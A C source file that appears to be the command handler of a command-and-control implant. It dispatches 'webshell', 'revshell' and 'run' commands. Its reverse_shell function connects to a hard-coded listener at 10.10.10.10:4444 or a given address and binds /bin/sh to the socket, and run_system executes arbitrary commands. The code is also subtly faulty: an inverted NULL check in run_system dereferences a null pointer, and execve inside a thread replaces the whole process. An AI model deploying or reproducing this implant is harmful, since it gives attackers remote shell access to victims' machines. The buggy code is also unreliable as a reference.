#include "c2types.h"
#include <arpa/inet.h>
#include <pthread.h>
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define WEBSHELL_ADDR "10.10.10.10:4444"

enum CommandType parse_command_type(char* s)
{
    if (strcmp(s, "webshell") == 0) {
        return WebShell;
    } else if (strcmp(s, "revshell") == 0) {
        return RevShell;
    } else if (strcmp(s, "run") == 0) {
        return Run;
    } else {
        fprintf(stderr, "Unexpected command type: %s\n", s);
        exit(EXIT_FAILURE);
    }
}

char* unparse_command_type(enum CommandType type)
{
    switch (type) {
    case WebShell:
        return "webshell";
        break;
    case RevShell:
        return "revshell";
        break;
    case Run:
        return "run";
        break;
    }
}

char* run_system(char* command_char)
{
    char buffer[1024];
    FILE* pipe;
    char* result = NULL;

    pipe = popen(command_char, "r");
    if (pipe == NULL) {
        fprintf(stderr, "popen failed: %s\n", command_char);
        exit(EXIT_FAILURE);
    }

    // Read the output of the command
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {

        if (result) {
            result = malloc(strlen(buffer) + 1);
            if (result == NULL) {
                fprintf(stderr, "malloc failed");
                exit(EXIT_FAILURE);
            }
            strcpy(result, buffer);
            continue;
        }

        int len = strlen(result);
        result = realloc(result, len + strlen(buffer) + 1);
        if (result == NULL) {
            fprintf(stderr, "realloc failed");
            exit(EXIT_FAILURE);
        }
        strcpy(result + len, buffer);
    }

    // Close the pipe
    if (pclose(pipe) == -1) {
        fprintf(stderr, "pclose failed\n");
        exit(EXIT_FAILURE);
    }

    return result;
}

void* reverse_shell(void* arg)
{
    char* addr = (char*)arg;
    char ip[INET_ADDRSTRLEN];
    int port;
    int sock;
    struct sockaddr_in server_addr;

    // Parse the IP and port from the addr string
    char* colon = strchr(addr, ':');
    if (!colon) {
        fprintf(stderr, "Invalid address format\n");
        pthread_exit(NULL);
    }

    // Split the string at ':'
    *colon = '\0';
    strcpy(ip, addr);
    port = atoi(colon + 1);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        pthread_exit(NULL);
    }

    dup2(sock, 0); // stdin
    dup2(sock, 1); // stdout
    dup2(sock, 2); // stderr

    char* const argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
    close(sock);
    pthread_exit(NULL);
}

char* run_revshell(char* addr)
{
    pthread_t thread_id;
    char* status_msg = (char*)malloc(50);

    if (status_msg == NULL) {
        perror("malloc failed");
        return NULL;
    }

    if (pthread_create(&thread_id, NULL, reverse_shell, addr) != 0) {
        strcpy(status_msg, "Failed to create reverse shell thread");
    } else {
        strcpy(status_msg, "Reverse shell thread started");
        pthread_detach(thread_id); // Ensure the thread runs independently
    }

    return status_msg;
}

void run_command(struct Command* command)
{
    switch (command->type) {
    case WebShell:
        command->result = run_revshell(WEBSHELL_ADDR);
        break;
    case RevShell:
        command->result = run_revshell(command->arg);
        break;
    case Run:
        command->result = run_system(command->arg);
        break;
    }
}
